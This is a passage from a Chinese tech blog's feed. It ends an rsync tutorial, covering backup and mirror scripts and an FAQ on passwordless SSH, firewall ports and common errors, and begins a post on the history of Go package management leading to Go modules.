class="variable">$LIST</span>; <span class="keyword">do</span></span><br><span class="line">mount /backup/<span class="variable">$d</span></span><br><span class="line">rsync -ax --exclude fstab --delete /<span class="variable">$d</span>/ /backup/<span class="variable">$d</span>/</span><br><span class="line">umount /backup/<span class="variable">$d</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">DAY=`date <span class="string">&quot;+%A&quot;</span>`</span><br><span class="line"></span><br><span class="line">rsync -a --delete /usr/<span class="built_in">local</span>/apache /data2/backups/<span class="variable">$DAY</span></span><br><span class="line">rsync -a --delete /data/solid /data2/backups/<span class="variable">$DAY</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>3&#x3001;&#x5BF9; vger.rutgers.edu &#x7684; cvs &#x6811;&#x8FDB;&#x884C;&#x955C;&#x50CF;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/www/cvs/vger/</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/bin:/usr/freeware/bin:/usr/bin:/bin</span><br><span class="line"></span><br><span class="line">RUN=`lps x | grep rsync | grep -v grep | wc -l`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$RUN</span>&quot;</span> -gt 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> already running</span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">rsync -az vger.rutgers.edu::cvs/CVSROOT/ChangeLog <span class="variable">$HOME</span>/ChangeLog</span><br><span class="line"></span><br><span class="line">sum1=`sum <span class="variable">$HOME</span>/ChangeLog`</span><br><span class="line">sum2=`sum /var/www/cvs/vger/CVSROOT/ChangeLog`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$sum1</span>&quot;</span> = <span class="string">&quot;<span class="variable">$sum2</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> nothing to <span class="keyword">do</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">rsync -az --delete --force vger.rutgers.edu::cvs/ /var/www/cvs/vger/</span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>Q&#xFF1A;&#x5982;&#x4F55;&#x901A;&#x8FC7; ssh &#x8FDB;&#x884C; rsync&#xFF0C;&#x800C;&#x4E14;&#x65E0;&#x987B;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF1F;</p><p>A&#xFF1A;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x6B65;&#x9AA4;</p><pre><code>* &#x901A;&#x8FC7; ssh-keygen &#x5728; server A &#x4E0A;&#x5EFA;&#x7ACB; SSH keys&#xFF0C;&#x4E0D;&#x8981;&#x6307;&#x5B9A;&#x5BC6;&#x7801;&#xFF0C;&#x4F60;&#x4F1A;&#x5728;~/.ssh &#x4E0B;&#x770B;&#x5230; identity &#x548C; identity.pub &#x6587;&#x4EF6;* &#x5728; server B &#x4E0A;&#x7684; home &#x76EE;&#x5F55;&#x5EFA;&#x7ACB;&#x5B50;&#x76EE;&#x5F55;. ssh* &#x5C06; A &#x7684; identity.pub &#x62F7;&#x8D1D;&#x5230; server B &#x4E0A;* &#x5C06; identity.pub &#x52A0;&#x5230;`~[user b]/.ssh/authorized_keys`* &#x4E8E;&#x662F; server A &#x4E0A;&#x7684; A &#x7528;&#x6237;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x4EE5;&#x7528;&#x6237; B ssh &#x5230; server B &#x4E0A;&#x4E86; e.g.`ssh -l userB serverB`* &#x8FD9;&#x6837;&#x5C31;&#x4F7F; server A &#x4E0A;&#x7684;&#x7528;&#x6237; A &#x5C31;&#x53EF;&#x4EE5; ssh &#x4EE5;&#x7528;&#x6237; B &#x7684;&#x8EAB;&#x4EFD;&#x65E0;&#x9700;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x5230; server B &#x4E0A;&#x4E86;&#x3002;</code></pre><p>Q&#xFF1A;&#x5982;&#x4F55;&#x901A;&#x8FC7;&#x5728;&#x4E0D;&#x5371;&#x5BB3;&#x5B89;&#x5168;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x901A;&#x8FC7;&#x9632;&#x706B;&#x5899;&#x4F7F;&#x7528; rsync?</p><p>A&#xFF1A;&#x89E3;&#x7B54;&#x5982;&#x4E0B;&#xFF1A;</p><p>&#x8FD9;&#x901A;&#x5E38;&#x6709;&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x670D;&#x52A1;&#x5668;&#x5728;&#x9632;&#x706B;&#x5899;&#x5185;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x670D;&#x52A1;&#x5668;&#x5728;&#x9632;&#x706B;&#x5899;&#x5916;&#x3002;&#x65E0;&#x8BBA;&#x54EA;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x901A;&#x5E38;&#x8FD8;&#x662F;&#x4F7F;&#x7528; ssh&#xFF0C;&#x8FD9;&#x65F6;&#x6700;&#x597D;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x5907;&#x4EFD;&#x7528;&#x6237;&#xFF0C;&#x5E76;&#x4E14;&#x914D;&#x7F6E; sshd &#x4EC5;&#x5141;&#x8BB8;&#x8FD9;&#x4E2A;&#x7528;&#x6237;&#x901A;&#x8FC7; RSA &#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x8FDB;&#x5165;&#x3002;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x5728;&#x9632;&#x706B;&#x5899;&#x5185;&#xFF0C;&#x5219;&#x6700;&#x597D;&#x9650;&#x5B9A;&#x5BA2;&#x6237;&#x7AEF;&#x7684; IP &#x5730;&#x5740;&#xFF0C;&#x62D2;&#x7EDD;&#x5176;&#x5B83;&#x6240;&#x6709;&#x8FDE;&#x63A5;&#x3002;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x673A;&#x5728;&#x9632;&#x706B;&#x5899;&#x5185;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x7B80; &#x5355;&#x5141;&#x8BB8;&#x9632;&#x706B;&#x5899;&#x6253;&#x5F00; TCP &#x7AEF;&#x53E3; 22 &#x7684; ssh &#x5916;&#x53D1;&#x8FDE;&#x63A5;&#x5C31; ok &#x4E86;&#x3002;</p><p>Q&#xFF1A;&#x6211;&#x80FD;&#x5C06;&#x66F4;&#x6539;&#x8FC7;&#x6216;&#x8005;&#x5220;&#x9664;&#x7684;&#x6587;&#x4EF6;&#x4E5F;&#x5907;&#x4EFD;&#x4E0A;&#x6765;&#x5417;&#xFF1F;</p><p>A&#xFF1A;&#x5F53;&#x7136;&#x53EF;&#x4EE5;&#xFF1A;</p><p>&#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#xFF1A;<code>rsync -other -options -backupdir = ./backup-2000-2-13 ...</code>&#x8FD9;&#x6837;&#x7684;&#x547D;&#x4EE4;&#x6765;&#x5B9E;&#x73B0;&#x3002;<br>&#x8FD9;&#x6837;&#x5982;&#x679C;&#x6E90;&#x6587;&#x4EF6;:/path/to/some/file.c &#x6539;&#x53D8;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x65E7;&#x7684;&#x6587;&#x4EF6;&#x5C31;&#x4F1A;&#x88AB;&#x79FB;&#x5230;./backup-2000-2-13/path/to/some/file.c&#xFF0C;<br>&#x8FD9;&#x91CC;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x624B;&#x5DE5;&#x5EFA;&#x7ACB;&#x8D77;&#x6765;</p><p>Q&#xFF1A;&#x6211;&#x9700;&#x8981;&#x5728;&#x9632;&#x706B;&#x5899;&#x4E0A;&#x5F00;&#x653E;&#x54EA;&#x4E9B;&#x7AEF;&#x53E3;&#x4EE5;&#x9002;&#x5E94; rsync&#xFF1F;</p><p>A&#xFF1A;&#x89C6;&#x60C5;&#x51B5;&#x800C;&#x5B9A;</p><p>rsync &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7; 873 &#x7AEF;&#x53E3;&#x7684; tcp &#x8FDE;&#x63A5;&#x4F20;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; 22 &#x7AEF;&#x53E3;&#x7684; ssh &#x6765;&#x8FDB;&#x884C;&#x6587;&#x4EF6;&#x4F20;&#x9012;&#xFF0C;&#x4F46;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0B;&#x5217;&#x547D;&#x4EE4;&#x6539;&#x53D8;&#x5B83;&#x7684;&#x7AEF;&#x53E3;&#xFF1A;<br><code>rsync --port 8730 otherhost::</code><br>&#x6216;&#x8005;<br><code>rsync -e &apos;ssh -p 2002&apos; otherhost:</code></p><p>Q&#xFF1A;&#x6211;&#x5982;&#x4F55;&#x901A;&#x8FC7; rsync &#x53EA;&#x590D;&#x5236;&#x76EE;&#x5F55;&#x7ED3;&#x6784;&#xFF0C;&#x5FFD;&#x7565;&#x6389;&#x6587;&#x4EF6;&#x5462;&#xFF1F;</p><p>A&#xFF1A;<code>rsync -av --include &apos;*/&apos; --exclude &apos;*&apos; source-dir dest-dir</code></p><p>Q&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x603B;&#x4F1A;&#x51FA;&#x73B0; &#x201C;Read-only file system&#x201D; &#x7684;&#x9519;&#x8BEF;&#x5462;&#xFF1F;</p><p>A&#xFF1A;&#x770B;&#x770B;&#x662F;&#x5426;&#x5FD8;&#x4E86;&#x8BBE; &#x201C;read only = no&#x201D; &#x4E86;</p><p>Q&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x4F1A;&#x51FA;&#x73B0;&#x2018;@ERROR: invalid gid&#x2019;&#x7684;&#x9519;&#x8BEF;&#x5462;&#xFF1F;</p><p>A&#xFF1A;rsync &#x4F7F;&#x7528;&#x65F6;&#x9ED8;&#x8BA4;&#x662F;&#x7528; uid=nobody;gid=nobody &#x6765;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x7684;&#x7CFB;&#x7EDF;&#x4E0D;&#x5B58;&#x5728; nobody &#x7EC4;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x8FD9;&#x6837;&#x7684;&#x9519;&#x8BEF;&#xFF0C;&#x53EF;&#x4EE5;&#x8BD5;&#x8BD5; gid = nogroup &#x6216;&#x8005;&#x5176;&#x5B83;</p><p>Q&#xFF1A;&#x7ED1;&#x5B9A;&#x7AEF;&#x53E3; 873 &#x5931;&#x8D25;&#x662F;&#x600E;&#x4E48;&#x56DE;&#x4E8B;&#xFF1F;</p><p>A&#xFF1A;&#x5982;&#x679C;&#x4F60;&#x4E0D;&#x662F;&#x4EE5; root &#x6743;&#x9650;&#x8FD0;&#x884C;&#x8FD9;&#x4E00;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x7684;&#x8BDD;&#xFF0C;&#x56E0;&#x4E3A; 1024 &#x7AEF;&#x53E3;&#x4EE5;&#x4E0B;&#x662F;&#x7279;&#x6743;&#x7AEF;&#x53E3;&#xFF0C;&#x4F1A;&#x51FA;&#x73B0;&#x8FD9;&#x6837;&#x7684;&#x9519;&#x8BEF;&#x3002;&#x4F60;&#x53EF;&#x4EE5;&#x7528;&#x2013;port &#x53C2;&#x6570;&#x6765;&#x6539;&#x53D8;&#x3002;</p><p>Q&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x8BA4;&#x8BC1;&#x5931;&#x8D25;&#xFF1F;</p><p>A&#xFF1A;&#x4ECE;&#x4F60;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x770B;&#x6765;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -a 144.16.251.213::<span class="built_in">test</span> <span class="built_in">test</span></span><br><span class="line">Password:</span><br><span class="line">@ERROR: auth failed on module <span class="built_in">test</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5E94;&#x8BE5;&#x662F;&#x6CA1;&#x6709;&#x4EE5;&#x4F60;&#x7684;&#x7528;&#x6237;&#x540D;&#x767B;&#x9646;&#x5BFC;&#x81F4;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x8BD5;&#x8BD5;<code>rsync -a max@144.16.251.213::test test</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x4EC0;&amp;#x4E48;&amp;#x662F;-Rsync&quot;&gt;&lt;a href=&quot;#&amp;#x4EC0;&amp;#x4E48;&amp;#x662F;-Rsync&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x4EC0;&amp;#x4E48;&amp;#x662F; Rsync&quot;&gt;
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Modules 初试 -- Go 包管理解决之道</title>
    <link href="https://jiemin.wang/2019/03/29/goModules/"/>
    <id>https://jiemin.wang/2019/03/29/goModules/</id>
    <published>2019-03-29T03:16:13.000Z</published>
    <updated>2019-03-29T04:41:58.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>Go &#x7684;&#x5305;&#x7BA1;&#x7406;&#x662F;&#x4E00;&#x76F4;&#x662F;&#x4E3A;&#x4EBA;&#x8BDF;&#x75C5;&#x4E4B;&#x5904;&#xFF0C;&#x4ECE; Go 1.5 &#x5F15;&#x5165;&#x7684; vendor &#x673A;&#x5236;&#xFF0C;&#x5230;&#x51C6;&#x5B98;&#x65B9;&#x5DE5;&#x5177; dep&#xFF0C;&#x76EE;&#x524D;&#x4E3A;&#x6B62;&#x8FD8;&#x6CA1;&#x4E00;&#x4E2A;&#x7B80;&#x4FBF;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;</p><p>&#x4E0D;&#x8FC7;&#x73B0;&#x5728; go modules &#x968F;&#x7740; golang1.11 &#x7684;&#x53D1;&#x5E03;&#x800C;&#x548C;&#x6211;&#x4EEC;&#x89C1;&#x9762;&#x4E86;&#xFF0C;&#x8FD9;&#x662F;&#x5B98;&#x65B9;&#x63D0;&#x5021;&#x7684;&#x65B0;&#x7684;&#x5305;&#x7BA1;&#x7406;&#xFF0C;&#x4E43;&#x81F3;&#x9879;&#x76EE;&#x7BA1;&#x7406;&#x673A;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x518D;&#x9700;&#x8981; GOPATH &#x7684;&#x5B58;&#x5728;&#x3002;<br><img src="/2019/03/29/goModules/go-module.jpg" title="go-module"></p><p>&#x6B23;&#x559C;&#x4E4B;&#x4F59;&#xFF0C;&#x8D76;&#x7D27;&#x4E0A;&#x624B;&#x6765;&#x8BD5;&#x4E00;&#x4E0B;&#x5427;~</p><p><strong>Go modules &#x7684;&#x524D;&#x4E16;&#x4ECA;&#x751F;</strong></p><p>&#x8BF4;&#x8D77; Go &#x7684;&#x5305;&#x4F9D;&#x8D56;&#x7BA1;&#x7406;&#xFF0C;&#x4F5C;&#x4E3A; Google &#x8111;&#x6B8B;&#x7C89;&#x7684;&#x6211;&#x4E5F;&#x662F;&#x8FDE;&#x8FDE;&#x53F9;&#x6C14;&#x3002;&#x3002;&#x3002;</p><p>&#x5982;&#x679C;&#x8BF4; Java(Maven) &#x662F;&#x5768; shit &#x7684;&#x8BDD;&#xFF0C;&#x90A3; Go &#x771F;&#x662F;&#x8FDE; Java &#x90FD;&#x4E0D;&#x5982;&#x3002;</p><p>&#x81EA; 2007 &#x5E74; &#x201C;&#x4E09;&#x5DE8;&#x5934;&#x201D;&#xFF08;<a href="https://github.com/griesemer" target="_blank" rel="noopener">Robert Griesemer</a>, <a href="https://en.wikipedia.org/wiki/Rob_Pike" target="_blank" rel="noopener">Rob Pike</a>, <a href="https://en.wikipedia.org/wiki/Ken_Thompson" target="_blank" rel="noopener">Ken Thompson</a>&#xFF09;&#x63D0;&#x51FA;&#x8BBE;&#x8BA1;&#x548C;&#x5B9E;&#x73B0; <a href="https://golang.org/" target="_blank" rel="noopener">Go &#x8BED;&#x8A00;</a>&#x4EE5;&#x6765;&#xFF0C;&#x8FD9;&#x95E8;&#x8BED;&#x8A00;&#x5DF2;&#x7ECF;&#x53D1;&#x5C55;&#x548C;&#x6F14;&#x5316;&#x4E86;&#x5341;&#x4F59;&#x5E74;&#x4E86;&#x3002;</p><p>&#x4F46;&#x662F;&#x81EA;&#x4ECE; Go &#x8BED;&#x8A00;&#x8BDE;&#x751F;&#x4EE5;&#x6765;&#x5427;&#xFF0C;&#x5927;&#x4F6C;&#x4EEC;&#x5C31;&#x8BA4;&#x4E3A;<code>go get</code> &#x5DF2;&#x7ECF;&#x633A;&#x597D;&#x4E86;&#xFF0C;&#x6CA1;&#x5FC5;&#x8981;&#x518D;&#x989D;&#x5916;&#x9020;&#x4E00;&#x4E2A;&#x8F6E;&#x5B50;&#x4E86;&#x2014;&#x2014;&#x5305;&#x7BA1;&#x7406;&#x5668;&#x3002;</p><p>&#x4E5F;&#x8BB8;&#x662F;&#x5927;&#x4F6C;&#x4EEC;&#x90FD;&#x4E0D;&#x9700;&#x8981;&#x56E2;&#x961F;&#x5F00;&#x53D1;&#x5427;&#xFF0C;&#x4F46;&#x662F;&#x5927;&#x4F6C;&#x6BD5;&#x7ADF;&#x662F;&#x5C11;&#x6570;&#xFF0C;&#x4E8E;&#x662F;&#xFF0C;&#x5404;&#x79CD;&#x5404;&#x6837;&#x7684;&#x793E;&#x533A;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x5C31;&#x51FA;&#x73B0;&#x4E86;&#xFF0C;&#x53EF;&#x8C13;&#x662F;&#x767E;&#x5BB6;&#x4E89;&#x9E23;&#x3002;</p><ul><li><a href="https://github.com/golang/dep" target="_blank" rel="noopener">dep</a></li><li><a href="https://github.com/kovetskiy/manul" target="_blank" rel="noopener">manul</a> - Vendor packages using git submodules.</li><li><a href="https://github.com/tools/godep" target="_blank" rel="noopener">Godep</a></li><li><a href="https://github.com/kardianos/govendor" target="_blank" rel="noopener">Govendor</a></li><li><a href="https://github.com/hectorj/godm" target="_blank" rel="noopener">godm</a></li><li><a href="https://github.com/govend/govend" target="_blank" rel="noopener">govend</a> - Manage dependencies like <code>go get</code> but for <code>/vendor</code>.</li><li><a href="https://github.com/Masterminds/glide" target="_blank" rel="noopener">Glide</a> - Manage packages like composer, npm, bundler, or other languages.</li></ul><p>&#x5F53;&#x521D;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x5217;&#x8868;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4E0D;&#x7981;&#x611F;&#x6168;&#xFF1A;&#x201C;&#x8FD9;&#x4E48;&#x591A;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x53EF;&#x771F;&#x662F;&#x6311;&#x82B1;&#x4E86;&#x6715;&#x7684;&#x773C;&#x775B;&#x5440;&#x3002;&#x201D;</p><p>Go &#x5B98;&#x65B9;&#x8BF4;&#xFF1A;&#x201C;&#x83AB;&#x6025;&#xFF0C;&#x8FD9;&#x4EFD;<a href="https://github.com/golang/go/wiki/PackageManagementTools" target="_blank" rel="noopener">&#x5B98;&#x65B9;&#x5BF9;&#x6BD4;</a>&#x62FF;&#x597D;&#x4E0D;&#x8C22;&#x3002;&#x201D;</p><p>Go &#x5728;&#x6784;&#x5EFA;&#x8BBE;&#x8BA1;&#x65B9;&#x9762;&#x6DF1;&#x53D7; Google &#x5185;&#x90E8;&#x5F00;&#x53D1;&#x5B9E;&#x8DF5;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x6BD4;&#x5982; go get &#x7684;&#x8BBE;&#x8BA1;&#x5C31;&#x6DF1;&#x53D7; <a href="https://cacm.acm.org/magazines/2016/7/204032-why-google-stores-billions-of-lines-of-code-in-a-single-repository/pdf" target="_blank" rel="noopener">Google &#x5185;&#x90E8;&#x5355;&#x4E00;&#x4EE3;&#x7801;&#x4ED3;&#x5E93; (single monorepo) &#x548C;&#x57FA;&#x4E8E;&#x4E3B;&#x5E72; (trunk/mainline based) &#x7684;&#x5F00;&#x53D1;&#x6A21;&#x578B;</a>&#x7684;&#x5F71;&#x54CD;&#xFF1A;&#x53EA;&#x83B7;&#x53D6; Trunk/mainline &#x4EE3;&#x7801;&#x548C;&#x7248;&#x672C;&#x65E0;&#x611F;&#x77E5;&#x3002;<br><img src="/2019/03/29/goModules/google-trunk-based-and-release-branch-dev-model.png" title="google-trunk-based-and-release-branch-dev-model"></p><blockquote><p>Google &#x5185;&#x90E8;&#x57FA;&#x4E8E;&#x4E3B;&#x5E72;&#x7684;&#x5F00;&#x53D1;&#x6A21;&#x578B;&#xFF1A;</p><ul><li>&#x6240;&#x6709;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x57FA;&#x4E8E;&#x4E3B;&#x5E72; trunk/mainline &#x5F00;&#x53D1;&#xFF1A;&#x63D0;&#x4EA4;&#x5230; trunk &#x6216;&#x4ECE; trunk &#x83B7;&#x53D6;&#x6700;&#x65B0;&#x7684;&#x4EE3;&#x7801;&#xFF08;&#x540C;&#x6B65;&#x5230;&#x672C;&#x5730; workspace&#xFF09;</li><li>&#x7248;&#x672C;&#x53D1;&#x5E03;&#x65F6;&#xFF0C;&#x5EFA;&#x7ACB; Release branch&#xFF0C;release branch &#x5B9E;&#x8D28;&#x4E0A;&#x5C31;&#x662F;&#x67D0;&#x4E00;&#x4E2A;&#x65F6;&#x523B;&#x4E3B;&#x5E72;&#x4EE3;&#x7801;&#x7684;&#x5FEB;&#x7167;</li><li>&#x5FC5;&#x987B;&#x540C;&#x6B65;&#x5230; release branch &#x4E0A;&#x7684; bug fix &#x548C;&#x589E;&#x5F3A;&#x6539;&#x8FDB;&#x4EE3;&#x7801;&#x4E5F;&#x901A;&#x5E38;&#x662F;&#x5148;&#x5728; trunk &#x4E0A;&#x63D0;&#x4EA4; (commit)&#xFF0C;&#x7136;&#x540E;&#x518D; cherry-pick &#x5230; release branch &#x4E0A;</li></ul></blockquote><p>&#x6211;&#x4EEC;&#x77E5;&#x9053; go get &#x83B7;&#x53D6;&#x7684;&#x4EE3;&#x7801;&#x4F1A;&#x653E;&#x5728; $GOPATH/src &#x4E0B;&#x9762;&#xFF0C;&#x800C; go build &#x4F1A;&#x5728; $GOROOT/src &#x548C; \$GOPATH/src &#x4E0B;&#x9762;&#x6309;&#x7167; import path &#x53BB;&#x641C;&#x7D22; package&#xFF0C;&#x7531;&#x4E8E; go get &#x83B7;&#x53D6;&#x7684;&#x90FD;&#x662F;&#x5404;&#x4E2A; package repo &#x7684; trunk/mainline &#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;Go 1.5 &#x4E4B;&#x524D;&#x7684; Go compiler &#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x76EE;&#x6807; Go &#x7A0B;&#x5E8F;&#x4F9D;&#x8D56;&#x5305;&#x7684; trunk/mainline &#x4EE3;&#x7801;&#x53BB;&#x7F16;&#x8BD1;&#x7684;&#x3002;&#x8FD9;&#x6837;&#x7684;&#x673A;&#x5236;&#x5E26;&#x6765;&#x7684;&#x95EE;&#x9898;&#x662F;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#xFF0C;&#x81F3;&#x5C11;&#x5305;&#x62EC;&#xFF1A;</p><ul><li>&#x56E0;&#x4F9D;&#x8D56;&#x5305;&#x7684; trunk &#x7684;&#x53D8;&#x5316;&#xFF0C;&#x5BFC;&#x81F4;&#x4E0D;&#x540C;&#x4EBA;&#x83B7;&#x53D6;&#x548C;&#x7F16;&#x8BD1;&#x4F60;&#x7684;&#x5305; / &#x7A0B;&#x5E8F;&#x65F6;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x5B9E;&#x8D28;&#x662F;&#x4E0D;&#x540C;&#x7684;&#xFF0C;&#x5373;&#x4E0D;&#x80FD;&#x5B9E;&#x73B0; reproduceable build</li><li>&#x56E0;&#x4F9D;&#x8D56;&#x5305;&#x7684; trunk &#x7684;&#x53D8;&#x5316;&#xFF0C;&#x5F15;&#x5165;&#x4E0D;&#x517C;&#x5BB9;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x5BFC;&#x81F4;&#x4F60;&#x7684;&#x5305; / &#x7A0B;&#x5E8F;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x7F16;&#x8BD1;</li><li>&#x56E0;&#x4F9D;&#x8D56;&#x5305;&#x6F14;&#x8FDB;&#x800C;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x7F16;&#x8BD1;&#xFF0C;&#x5BFC;&#x81F4;&#x4F60;&#x7684;&#x5305; / &#x7A0B;&#x5E8F;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x7F16;&#x8BD1;</li></ul><p>&#x4E3A;&#x4E86;&#x5B9E;&#x73B0; reporduceable build&#xFF0C;Go 1.5 &#x5F15;&#x5165;&#x4E86; Vendor &#x673A;&#x5236;&#xFF0C;Go &#x7F16;&#x8BD1;&#x5668;&#x4F1A;&#x4F18;&#x5148;&#x5728; vendor &#x4E0B;&#x641C;&#x7D22;&#x4F9D;&#x8D56;&#x7684;&#x7B2C;&#x4E09;&#x65B9;&#x5305;&#xFF0C;&#x8FD9;&#x6837;&#x5982;&#x679C;&#x5F00;&#x53D1;&#x8005;&#x5C06;&#x7279;&#x5B9A;&#x7248;&#x672C;&#x7684;&#x4F9D;&#x8D56;&#x5305;&#x5B58;&#x653E;&#x5728; vendor &#x4E0B;&#x9762;&#x5E76;&#x63D0;&#x4EA4;&#x5230; code repo&#xFF0C;&#x90A3;&#x4E48;&#x6240;&#x6709;&#x4EBA;&#x7406;&#x8BBA;&#x4E0A;&#x90FD;&#x4F1A;&#x5F97;&#x5230;&#x540C;&#x6837;&#x7684;&#x7F16;&#x8BD1;&#x7ED3;&#x679C;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0; reporduceable build&#x3002;</p><p>&#x5728; Go 1.5 &#x53D1;&#x5E03;&#x540E;&#x7684;&#x82E5;&#x5E72;&#x5E74;&#xFF0C;gopher &#x4EEC;&#x628A;&#x6CE8;&#x610F;&#x529B;&#x90FD;&#x96C6;&#x4E2D;&#x5728;&#x5982;&#x4F55;&#x5229;&#x7528; vendor &#x89E3;&#x51B3;&#x5305;&#x4F9D;&#x8D56;&#x95EE;&#x9898;&#xFF0C;&#x4ECE;&#x624B;&#x5DE5;&#x6DFB;&#x52A0;&#x4F9D;&#x8D56;&#x5230; vendor&#x3001;&#x624B;&#x5DE5;&#x66F4;&#x65B0;&#x4F9D;&#x8D56;&#xFF0C;&#x5230;&#x4E00;&#x4F17;&#x5305;&#x4F9D;&#x8D56;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#x7684;&#x8BDE;&#x751F;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;<a href="https://github.com/kardianos/govendor" target="_blank" rel="noopener">Govendor</a>&#x3001;<a href="https://github.com/Masterminds/glide" target="_blank" rel="noopener">glide</a> &#x4EE5;&#x53CA;&#x53F7;&#x79F0;&#x51C6;&#x5B98;&#x65B9;&#x5DE5;&#x5177;&#x7684; <a href="https://github.com/golang/dep" target="_blank" rel="noopener">dep</a>&#xFF0C;&#x52AA;&#x529B;&#x5730;&#x5C1D;&#x8BD5;&#x7740;&#x6309;&#x7167;&#x5F53;&#x4ECA;&#x4E3B;&#x6D41;&#x601D;&#x8DEF;&#x89E3;&#x51B3;&#x7740;&#x8BF8;&#x5982; &#x201C;&#x94BB;&#x77F3;&#x578B;&#x4F9D;&#x8D56;&#x201D; &#x7B49;&#x96BE;&#x9898;&#x3002;</p><p>&#x6B63;&#x5F53; gopher &#x8BA4;&#x4E3A; dep &#x5C06; 